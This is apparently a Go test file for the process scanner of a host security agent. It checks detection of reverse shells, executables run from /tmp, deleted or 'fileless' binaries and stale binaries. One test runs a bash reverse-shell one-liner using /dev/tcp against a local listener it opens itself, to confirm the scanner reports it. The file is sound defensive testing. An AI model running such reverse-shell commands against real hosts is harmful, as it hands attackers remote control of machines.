package procscan

import (
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/xyfu/xnux-agent/internal/procfs"
	"github.com/xyfu/xnux-agent/internal/raw"
)

func TestDecodeAddr(t *testing.T) {
	for in, want := range map[string]string{
		"0100007F:1F90":                         "127.0.0.1:8080",
		"0000000000000000FFFF00000100007F:0016": "127.0.0.1:22",
		"B80D01200000000000000000EFBEADDE:115C": "[2001:db8::dead:beef]:4444",
		"zz:1":                                  "",
	} {
		if got := decodeAddr(in); got != want {
			t.Errorf("decodeAddr(%s) = %q, want %q", in, got, want)
		}
	}
}

func scanner() *Scanner {
	return &Scanner{Proc: procfs.FS{Root: "/proc"}, Root: "/"}
}

func find(recs []raw.Record, pid int) *raw.Record {
	for i := range recs {
		if recs[i].Data["pid"] == pid {
			return &recs[i]
		}
	}
	return nil
}

// copyBinary copies sleep(1) into dir so it can be run from there.
func copyBinary(t *testing.T, dir, name string) string {
	t.Helper()
	src, err := exec.LookPath("sleep")
	if err != nil {
		t.Skip("no sleep binary")
	}
	in, err := os.Open(src)
	if err != nil {
		t.Fatal(err)
	}
	defer in.Close()
	dst := filepath.Join(dir, name)
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY, 0o755)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := io.Copy(out, in); err != nil {
		t.Fatal(err)
	}
	out.Close()
	return dst
}

func run(t *testing.T, name string, args ...string) *exec.Cmd {
	t.Helper()
	cmd := exec.Command(name, args...)
	if err := cmd.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = cmd.Process.Kill(); _ = cmd.Wait() })
	time.Sleep(100 * time.Millisecond) // let exec finish
	return cmd
}

// F4-5 acceptance: `bash -i >& /dev/tcp/…` is detected.
func TestReverseShell(t *testing.T) {
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("no bash")
	}
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	port := ln.Addr().(*net.TCPAddr).Port
	cmd := run(t, "bash", "-c", "exec bash -i >& /dev/tcp/127.0.0.1/"+strconv.Itoa(port)+" 0>&1")
	if err := ln.(*net.TCPListener).SetDeadline(time.Now().Add(5 * time.Second)); err != nil {
		t.Fatal(err)
	}
	conn, err := ln.Accept()
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()

	// The shell may still be wiring fds 0–2 when the connection is accepted.
	s := scanner()
	var r *raw.Record
	for i := 0; i < 20 && r == nil; i++ {
		start := time.Now()
		recs := s.Scan()
		t.Logf("scan with %d findings took %v", len(recs), time.Since(start))
		r = find(recs, cmd.Process.Pid)
		if r == nil {
			time.Sleep(50 * time.Millisecond)
		}
	}
	if r == nil || r.Kind != "proc_reverse_shell" || r.Severity != "P0" || r.Data["remote"] != "127.0.0.1:"+strconv.Itoa(port) {
		t.Fatalf("reverse shell not reported: %+v", r)
	}
	if !strings.Contains(r.Data["cmdline"].(string), "bash") {
		t.Fatalf("cmdline: %+v", r.Data)
	}
	// Reported once per process.
	if again := find(s.Scan(), cmd.Process.Pid); again != nil {
		t.Fatal("reported twice")
	}
}

func TestTmpAndDeleted(t *testing.T) {
	tmp, err := os.MkdirTemp("/tmp", "xnux-procscan-")
	if err != nil {
		t.Skip(err)
	}
	defer os.RemoveAll(tmp)
	// Not under a temp directory: the package directory itself.
	stable, err := os.MkdirTemp(".", "bin-")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(stable)
	abs, _ := filepath.Abs(stable)

	inTmp := run(t, copyBinary(t, tmp, "miner"), "30")
	gone := copyBinary(t, tmp, "dropper")
	fileless := run(t, gone, "30")
	os.Remove(gone)

	upgraded := copyBinary(t, abs, "daemon")
	stale := run(t, upgraded, "30")
	os.Remove(upgraded)
	copyBinary(t, abs, "daemon") // the package manager put a new file there

	removed := copyBinary(t, abs, "orphan")
	deletedExe := run(t, removed, "30")
	os.Remove(removed)

	s := scanner()
	recs := s.Scan()
	for _, c := range []struct {
		cmd       *exec.Cmd
		kind, sev string
	}{
		{inTmp, "proc_tmp_exec", "P2"},
		{fileless, "proc_fileless", "P1"},
		{stale, "proc_stale_binary", "P3"},
		{deletedExe, "proc_deleted_exe", "P2"},
	} {
		r := find(recs, c.cmd.Process.Pid)
		if r == nil || r.Kind != c.kind || r.Severity != c.sev {
			t.Errorf("pid %d: got %+v, want %s %s", c.cmd.Process.Pid, r, c.kind, c.sev)
		}
	}

	// A stale binary is reported once a day per path, even for a new process.
	run(t, upgraded, "30")
	s2 := scanner()
	s2.SetStale(s.Stale())
	for _, r := range s2.Scan() {
		if r.Kind == "proc_stale_binary" {
			t.Errorf("stale binary reported again within a day: %+v", r)
		}
	}

	// Whitelisted by comm.
	s3 := scanner()
	s3.WhitelistComm = []string{"miner"}
	if r := find(s3.Scan(), inTmp.Process.Pid); r != nil {
		t.Errorf("whitelisted process reported: %+v", r)
	}
}
